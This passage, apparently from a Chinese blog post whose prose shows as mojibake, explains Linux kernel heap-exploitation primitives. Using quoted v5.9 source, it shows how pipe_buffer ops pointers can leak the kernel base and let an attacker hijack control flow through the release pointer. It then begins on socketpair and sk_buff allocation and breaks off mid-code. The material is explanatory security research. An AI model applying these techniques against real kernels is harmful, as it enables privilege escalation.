class="keyword">unsigned</span> <span class="keyword">int</span> w_counter;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line">    <span class="comment">//pipe_bufferæ•°ç»„,16ä¸ª,æ¯ä¸ªå¤§å°ä¸º0xa0,é€šå¸¸æˆ‘ä»¬ä»è¿™ä¸Šé¢æ³„éœ²åœ°å€æˆ–è€…åŠ«æŒç¨‹åºæµ</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘¡é‡Šæ”¾-1"   >
          <a href="#â‘¡é‡Šæ”¾-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡é‡Šæ”¾-1" class="headerlink" title="â‘¡é‡Šæ”¾"></a>â‘¡é‡Šæ”¾</h4>
      <p>ç›´æ¥ä½¿ç”¨<code>close</code>å‡½æ•°é‡Šæ”¾ç®¡é“ç›¸å…³çš„æ–‡ä»¶æè¿°ç¬¦fdä¸¤ç«¯ã€‚</p>
<p>å‡½æ•°é“¾è°ƒç”¨é“¾ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pipe_release()-&gt;put_pipe_info()-&gt;free_pipe_info()</span><br></pre></td></tr></table></div></figure>

<p>éœ€è¦æ³¨æ„çš„æ—¶ï¼Œåœ¨<code>put_pipe_info</code>å‡½æ•°ä¸­</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">put_pipe_info</span><span class="params">(struct inode *inode, struct pipe_inode_info *pipe)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> kill = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	spin_lock(&amp;inode-&gt;i_lock);</span><br><span class="line">	<span class="keyword">if</span> (!--pipe-&gt;files) &#123;</span><br><span class="line">		inode-&gt;i_pipe = <span class="literal">NULL</span>;</span><br><span class="line">		kill = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	spin_unlock(&amp;inode-&gt;i_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å½“filesä¸º0æ‰ä¼šè¿›å…¥è¯¥å‡½æ•°</span></span><br><span class="line">	<span class="keyword">if</span> (kill)</span><br><span class="line">		free_pipe_info(pipe);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>åªæœ‰<code>pipe_inode_info</code>è¿™ä¸ªç®¡ç†ç»“æ„ä¸­çš„<code>files</code>æˆå‘˜ä¸º0ï¼Œæ‰ä¼šè¿›è¡Œé‡Šæ”¾ï¼Œä¹Ÿå°±æ˜¯ç®¡é“ä¸¤ç«¯éƒ½å…³é—­æ‰æ‰è¡Œã€‚</p>
<p>ç›¸å…³é‡Šæ”¾å‡½æ•°<code>free_pipe_info</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_pipe_info</span><span class="params">(struct pipe_inode_info *pipe)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="comment">//å’Œç®¡é“ç›¸å…³çš„é‡Šæ”¾æœ‰å…³ï¼Œä¹Ÿæ˜¯ç›¸å…³çš„æ¼æ´ç‚¹</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pipe-&gt;ring_size; i++) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> pipe-&gt;bufs + i;</span><br><span class="line">		<span class="keyword">if</span> (buf-&gt;ops)</span><br><span class="line">			pipe_buf_release(pipe, buf);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="comment">//é‡Šæ”¾pipe_bufferæ•°ç»„,kmalloc-1024</span></span><br><span class="line">	kfree(pipe-&gt;bufs);</span><br><span class="line">    <span class="comment">//é‡Šæ”¾pipe_inode_infoç®¡ç†ç»“æ„,kmalloc-192</span></span><br><span class="line">	kfree(pipe);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h3 id="3-åˆ©ç”¨"   >
          <a href="#3-åˆ©ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-åˆ©ç”¨" class="headerlink" title="(3)åˆ©ç”¨"></a>(3)åˆ©ç”¨</h3>
      
        <h4 id="â‘ ä¿¡æ¯æ³„éœ²"   >
          <a href="#â‘ ä¿¡æ¯æ³„éœ²" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ ä¿¡æ¯æ³„éœ²" class="headerlink" title="â‘ ä¿¡æ¯æ³„éœ²"></a>â‘ ä¿¡æ¯æ³„éœ²</h4>
      <p><code>pipe_buffer</code>ç»“æ„çš„<code>buf</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å…¶ä¸­çš„<code>ops</code>æˆå‘˜ï¼Œå³<code>struct pipe_buf_operations</code>ç»“æ„çš„<code>pipe-&gt;bufs[i]-&gt;ops</code>ï¼Œå…¶ä¸­ä¿å­˜ç€å…¨å±€çš„å‡½æ•°è¡¨ï¼Œå¯é€šè¿‡è¿™ä¸ªæ¥æ³„éœ²å†…æ ¸åŸºåœ°å€ï¼Œç›¸å…³ç»“æ„å¦‚ä¸‹æ‰€ç¤º</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> (*release)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> (*get)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡åŠ«æŒç¨‹åºæµ"   >
          <a href="#â‘¡åŠ«æŒç¨‹åºæµ" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡åŠ«æŒç¨‹åºæµ" class="headerlink" title="â‘¡åŠ«æŒç¨‹åºæµ"></a>â‘¡åŠ«æŒç¨‹åºæµ</h4>
      <p>å½“å…³é—­äº†ç®¡é“çš„ä¸¤ç«¯æ—¶ï¼Œè°ƒç”¨åˆ°<code>free_pipe_info</code>å‡½æ•°ï¼Œåœ¨æ¸…ç†<code>pipe_buffer</code>æ—¶è¿›å…¥å¦‚ä¸‹åˆ¤æ–­ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (buf-&gt;ops)</span><br><span class="line">    pipe_buf_release(pipe, buf);</span><br></pre></td></tr></table></div></figure>

<p>å½“ç®¡é“ä¸­å­˜åœ¨æœªè¢«è¯»å–çš„æ•°æ®æ—¶ï¼Œå³æˆ‘ä»¬éœ€è¦è°ƒç”¨<code>write</code>å‘ç®¡é“çš„å†™å…¥ç«¯å†™å…¥æ•°æ®</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function">    <span class="title">pipe_write</span><span class="params">(struct kiocb *iocb, struct iov_iter *from)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">    buf-&gt;page = page;</span><br><span class="line">    buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">    buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">    buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ç„¶åä¸è¦å°†æ•°æ®å…¨éƒ¨è¯»å–å‡ºæ¥ï¼Œå¦‚æœå…¨éƒ¨è¯»å–å‡ºæ¥çš„è¯ï¼Œé‚£ä¹ˆåœ¨<code>read</code>å¯¹åº”çš„<code>pipe_read</code>å‡½æ•°ä¸­å°±ä¼šå¦‚ä¸‹æƒ…å†µ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9  /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function">    <span class="title">pipe_read</span><span class="params">(struct kiocb *iocb, struct iov_iter *to)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="keyword">if</span> (!buf-&gt;len) &#123;</span><br><span class="line">        pipe_buf_release(pipe, buf);</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ä»è€Œè°ƒç”¨<code>pipe_buf_release</code>å°†<code>buf-&gt;ops</code>æ¸…ç©ºã€‚</p>
<p>ğŸ”ºæ³¨ï¼šï¼ˆå…¶å®è¿™é‡Œæ—¢ç„¶è°ƒç”¨åˆ°äº†<code>pipe_buf_release</code>å‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥é€šè¿‡<code>read</code>å°†ç®¡é“<code>pipe</code>ä¸­çš„æ‰€æœ‰æ•°æ®è¯»å–å‡ºæ¥ï¼Œå…¶å®ä¹Ÿèƒ½æ‰§è¡Œè¯¥<code>release</code>å‡½æ•°æŒ‡é’ˆçš„ï¼Œä»è€ŒåŠ«æŒç¨‹åºæ§åˆ¶æµçš„ã€‚ï¼‰</p>
<p>é‚£ä¹ˆæ¥ç€ä¸Šè¿°çš„æƒ…å†µï¼Œé‚£ä¹ˆåœ¨å…³é—­ä¸¤ç«¯æ—¶<code>buf-&gt;ops</code>è¿™ä¸ªå‡½æ•°è¡¨å°±ä¼šå­˜åœ¨</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509192251738.png" alt="image-20220509192251738"></p>
<p>è€Œå½“<code>buf-&gt;ops</code>è¿™ä¸ªå‡½æ•°è¡¨å­˜åœ¨æ—¶ï¼Œå…³é—­ç®¡é“ç¬¦ä¸¤ç«¯è¿›å…¥ä¸Šè¿°åˆ¤æ–­ä¹‹åï¼Œå°±ä¼šè°ƒç”¨åˆ°å…¶ä¸­çš„<code>pipe_buf_release</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šè°ƒç”¨åˆ°è¿™ä¸ª<code>buf-&gt;ops</code>å‡½æ•°è¡¨ç»“æ„ä¸‹å¯¹åº”çš„<code>relase</code>å‡½æ•°æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆåœ¨ä¸Šè¿°çš„<code>pipe_buf_operations</code>ç»“æ„ä¸­æœ‰æåˆ°</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509193945468.png" alt="image-20220509193945468"></p>
<p>é‚£ä¹ˆå¦‚æœåŠ«æŒäº†<code>buf-&gt;ops</code>è¿™ä¸ªå‡½æ•°è¡¨ï¼Œå°±èƒ½æ§åˆ¶åˆ°<code>release</code>å‡½æ•°æŒ‡é’ˆï¼Œä»è€ŒåŠ«æŒæ§åˆ¶æµç¨‹ã€‚</p>
<p>ä¸è¿‡<code>pipe</code>ç®¡é“å…·ä½“çš„ä¿å­˜çš„æ•°æ®æ”¾åœ¨å“ªé‡Œï¼Œè¿˜æ˜¯ä¸å¤ªæ¸…æ¥šï¼Œå¬<code>bsauce</code>è¯´æ˜¯åœ¨<code>struct pipe_buffer</code>ç»“æ„ä¸‹<code>buf</code>çš„<code>page</code>é‡Œé¢ï¼Œä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°ï¼Œåç»­è¿˜éœ€è¦ç»§ç»­çœ‹çœ‹ï¼Œå…ˆmarkä¸€ä¸‹ã€‚è¿™æ ·ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼Œæ¯å†™å…¥ä¸€æ¡ä¿¡æ¯æ—¶ï¼Œå†…æ ¸çš„<code>kmalloc</code>å¯¹åº”çš„å †å†…å­˜åŸºæœ¬æ˜¯ä¸å‘ç”Ÿå˜åŒ–çš„ï¼Œä¸ä¸‹é¢æåˆ°çš„<code>sk_buff</code>æœ‰ç‚¹ä¸åŒã€‚</p>

        <h2 id="8-sk-buffâ€”kmalloc-512åŠä»¥ä¸Š"   >
          <a href="#8-sk-buffâ€”kmalloc-512åŠä»¥ä¸Š" class="heading-link"><i class="fas fa-link"></i></a><a href="#8-sk-buffâ€”kmalloc-512åŠä»¥ä¸Š" class="headerlink" title="8.sk_buffâ€”kmalloc-512åŠä»¥ä¸Š"></a>8.sk_buffâ€”kmalloc-512åŠä»¥ä¸Š</h2>
      <p>å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40039738/article/details/81095013" >(31æ¡æ¶ˆæ¯) socketpairçš„ç”¨æ³•å’Œç†è§£_é›ªè¿‡æ— ç—•_çš„åšå®¢-CSDNåšå®¢_socketpair</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>å’Œè¯¥ç»“æ„ä½“ç›¸å…³çš„æ˜¯ä¸€ä¸ª<code>socketpair</code>ç³»ç»Ÿè°ƒç”¨è¿™ä¸ªä¹Ÿç®—æ˜¯<code>socket</code>ç½‘ç»œåè®®çš„ä¸€ç§ï¼Œä½†æ˜¯æ˜¯åœ¨æœ¬åœ°è¿›ç¨‹ä¹‹é—´é€šä¿¡çš„ï¼Œè€Œéåœ¨ç½‘ç»œä¹‹é—´çš„é€šä¿¡ã€‚è¯´åˆ°åº•ï¼Œè¿™ä¸ªå…¶å®å’Œ<code>pipe</code>éå¸¸åƒï¼Œä¹Ÿæ˜¯ä¸€ä¸ªè¿›ç¨‹é—´çš„é€šä¿¡æ‰‹æ®µã€‚ä¸è¿‡ç›¸å…³åŒºåˆ†å¦‚ä¸‹ï¼š</p>
<ul>
<li>æ•°æ®ä¼ è¾“æ¨¡å¼<ul>
<li><code>pipe</code>ï¼šå•å·¥ï¼Œå‘é€ç«¯<code>fd[1]</code>å‘é€æ•°æ®ï¼Œæ¥æ”¶ç«¯<code>fd[0]</code>æ¥æ”¶æ•°æ®</li>
<li><code>socketpair</code>ï¼šå…¨åŒå·¥ï¼ŒåŒä¸€æ—¶åˆ»ä¸¤ç«¯å‡å¯å‘é€å’Œæ¥æ”¶æ•°æ®ï¼Œæ— è®ºä¿¡é“ä¸­çš„æ•°æ®æ˜¯å¦è¢«æ¥æ”¶å®Œæ¯•ã€‚</li>
</ul>
</li>
<li>æ¨¡å¼<ul>
<li><code>pipe</code>ï¼šç”±<code>flag</code>æ¥å®šä¹‰ä¸åŒæ¨¡å¼</li>
<li><code>socketpair</code>ï¼šé»˜è®¤é˜»å¡çŠ¶æ€</li>
</ul>
</li>
</ul>
<p>æ­¤å¤–åœ¨ã€ŠLinuxç³»ç»Ÿç¼–ç¨‹æ‰‹å†Œã€‹ä¸€ä¹¦ä¸­æåˆ°ï¼Œ<code>pipe()</code>å‡½æ•°å®é™…ä¸Šè¢«å®ç°æˆäº†ä¸€ä¸ªå¯¹<code>socketpair</code>çš„è°ƒç”¨ã€‚</p>

        <h3 id="1-ä½¿ç”¨æ–¹æ³•-1"   >
          <a href="#1-ä½¿ç”¨æ–¹æ³•-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä½¿ç”¨æ–¹æ³•-1" class="headerlink" title="(1)ä½¿ç”¨æ–¹æ³•"></a>(1)ä½¿ç”¨æ–¹æ³•</h3>
      
        <h4 id="â‘ åˆ›å»º-1"   >
          <a href="#â‘ åˆ›å»º-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ›å»º-1" class="headerlink" title="â‘ åˆ›å»º"></a>â‘ åˆ›å»º</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//é»˜è®¤å¿…é¡»</span></span><br><span class="line"><span class="keyword">int</span> socket_fd[<span class="number">2</span>];</span><br><span class="line"><span class="comment">//domainå‚æ•°å¿…é¡»è¢«æŒ‡å®šä¸ºAF_UNIX,ä¸åŒçš„</span></span><br><span class="line"><span class="keyword">int</span> sockPair_return = socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, socket_fd);</span><br><span class="line"><span class="keyword">if</span>( sockPair_return &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    perror( <span class="string">&quot;socketpair()&quot;</span> );</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ç„¶åå’Œ<code>pipe</code>ç®¡é“ä¸€æ ·ï¼Œä½¿ç”¨<code>write/read</code>å³å¯ï¼Œä¸è¿‡è¿™ä¸ªçš„fdä¸¤ç«¯éƒ½å¯ä»¥å†™å…¥è¯»å–ï¼Œä½†æ˜¯æ¶ˆæ¯ä¼ é€’çš„æ—¶å€™ä¸€ç«¯å†™å…¥æ¶ˆæ¯ï¼Œå°±éœ€è¦ä»å¦ä¸€ç«¯æ‰èƒ½æŠŠæ¶ˆæ¯è¯»å–å‡ºæ¥</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">0x8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span>* msg = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line">write(socket_fd[<span class="number">0</span>],msg,<span class="number">0x8</span>);</span><br><span class="line">read(socket_fd[<span class="number">1</span>],buf,<span class="number">0x8</span>);</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡é‡Šæ”¾-2"   >
          <a href="#â‘¡é‡Šæ”¾-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡é‡Šæ”¾-2" class="headerlink" title="â‘¡é‡Šæ”¾"></a>â‘¡é‡Šæ”¾</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">close(socket_fd[<span class="number">0</span>]);</span><br><span class="line">close(socket_fd[<span class="number">1</span>]);</span><br></pre></td></tr></table></div></figure>

<p>å¯ä»¥çœ‹åˆ°å’Œ<code>pipe</code>æ˜¯å¾ˆç›¸ä¼¼çš„ã€‚</p>

        <h3 id="2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾-1"   >
          <a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾-1" class="headerlink" title="(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾"></a>(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾</h3>
      <p>åœ¨è°ƒç”¨<code>socketpair</code>è¿™ä¸ªç³»ç»Ÿè°ƒç”¨å·æ—¶ï¼Œå¹¶ä¸ä¼šè¿›è¡Œç›¸å…³çš„å†…å­˜åˆ†é…ï¼Œåªæœ‰åœ¨ä½¿ç”¨<code>write</code>æ¥å†™å…¥æ¶ˆæ¯ï¼Œè¿›è¡Œæ•°æ®ä¼ è¾“æ—¶æ‰ä¼šåˆ†é…ã€‚</p>

        <h4 id="â‘ åˆ†é…-1"   >
          <a href="#â‘ åˆ†é…-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ†é…-1" class="headerlink" title="â‘ åˆ†é…"></a>â‘ åˆ†é…</h4>
      <p>åœ¨è°ƒç”¨<code>write</code>è¿›è¡Œæ•°æ®å†™å…¥æ—¶</p>
<p>å‡½æ•°é“¾ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write -&gt; ksys_write() -&gt; vfs_write() -&gt; new_sync_write() -&gt; call_write_iter() -&gt; sock_write_iter() -&gt; sock_sendmsg() -&gt; sock_sendmsg_nosec() -&gt; unix_stream_sendmsg()-&gt;å†…å­˜ç”³è¯·/æ•°æ®å¤åˆ¶</span><br></pre></td></tr></table></div></figure>

<p>åœ¨<code>unix_stream_sendmsg</code>å¼€å§‹åˆ†å‰</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/unix/af_unix.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">unix_stream_sendmsg</span><span class="params">(struct socket *sock, struct msghdr *msg,</span></span></span><br><span class="line"><span class="params"><span class="function">			       <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">other</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">int</span> err, size;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">	<span class="keyword">int</span> sent = <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">scm_cookie</span> <span class="title">scm</span>;</span></span><br><span class="line">	<span class="keyword">bool</span> fds_sent = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">int</span> data_len;</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">	<span class="keyword">while</span> (sent &lt; len) &#123;</span><br><span class="line">		size = len - sent;</span><br><span class="line">		<span class="comment">/* Keep two messages in the pipe so it schedules better */</span></span><br><span class="line">		size = <span class="keyword">min_t</span>(<span class="keyword">int</span>, size, (sk-&gt;sk_sndbuf &gt;&gt; <span class="number">1</span>) - <span class="number">64</span>);</span><br><span class="line">		<span class="comment">/* allow fallback to order-0 allocations */</span></span><br><span class="line">		size = <span class="keyword">min_t</span>(<span class="keyword">int</span>, size, SKB_MAX_HEAD(<span class="number">0</span>) + UNIX_SKB_FRAGS_SZ);</span><br><span class="line">		data_len = <span class="keyword">max_t</span>(<span class="keyword">int</span>, <span class="number">0</span>, size - SKB_MAX_HEAD(<span class="number">0</span>));</span><br><span class="line">		data_len = <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, size, PAGE_ALIGN(data_len));</span><br><span class="line">        <span class="comment">//------------------åˆ†å‰ä¸€:å†…å­˜ç”³è¯·éƒ¨åˆ†</span></span><br><span class="line">		skb = sock_alloc_send_pskb(sk, size - data_len, data_len,</span><br><span class="line">					   msg-&gt;msg_flags &amp; MSG_DONTWAIT, &amp;err,</span><br><span class="line">					   get_order(UNIX_SKB_FRAGS_SZ));</span><br><span class="line">        <span class="comment">//ç›¸å…³æ£€æŸ¥éƒ¨åˆ†</span></span><br><span class="line">		<span class="keyword">if</span> (!skb)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span 